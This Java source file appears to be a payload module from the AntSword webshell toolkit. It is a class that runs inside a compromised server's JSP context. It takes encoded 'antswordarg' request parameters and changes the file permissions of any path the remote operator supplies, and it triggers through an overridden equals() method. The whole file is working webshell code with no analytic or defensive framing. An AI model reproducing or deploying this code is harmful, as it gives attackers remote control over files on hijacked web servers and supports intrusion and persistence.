import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.attribute.PosixFilePermission;
import java.util.HashSet;
import java.util.Set;

public class Chmod {
    public String encoder;
    public String cs;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordarg1";
        String varkey2 = "antswordarg2";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
            String z2 = EC(decode(request.getParameter(varkey2) + "", encoder, cs), encoder, cs);
            output.append(tag_s);
            sb.append(ChmodCode(z1, z2));
            output.append(sb.toString());
            output.append(tag_e);
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s, String encoder, String cs) throws Exception {
        if (encoder.equals("hex") || encoder == "hex") return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str, String encode, String cs) throws Exception {
        if (encode.equals("hex") || encode == "hex") {
            if (str == "null" || str.equals("null")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encode.equals("base64") || encode == "base64") {
            byte[] bt = null;
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
            return new String(bt, "UTF-8");
        }
        return str;
    }

    Set<PosixFilePermission> getPosixFilePermission(
            int permissions) {

        Set<PosixFilePermission> filePermissions = new HashSet<PosixFilePermission>();

        // using bitwise operations check the file permissions in decimal
        // numeric system
        // e.g. 100100 AND 100, we will have for result 100
        if ((permissions & 256) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_READ);
        }
        if ((permissions & 128) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_WRITE);
        }
        if ((permissions & 64) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_EXECUTE);
        }
        if ((permissions & 32) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_READ);
        }
        if ((permissions & 16) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_WRITE);
        }
        if ((permissions & 8) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_EXECUTE);
        }
        if ((permissions & 4) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_READ);
        }
        if ((permissions & 2) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_WRITE);
        }
        if ((permissions & 1) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_EXECUTE);
        }

        return filePermissions;
    }

    String ChmodCode(String path, String permstr) {
        File f = new File(path);
        Set perms = getPosixFilePermission(Integer.parseInt(permstr, 8));
        try {
            Files.setPosixFilePermissions(f.toPath(), perms);
        } catch (Exception e) {
            return "0";
        }
        return "1";
    }

}
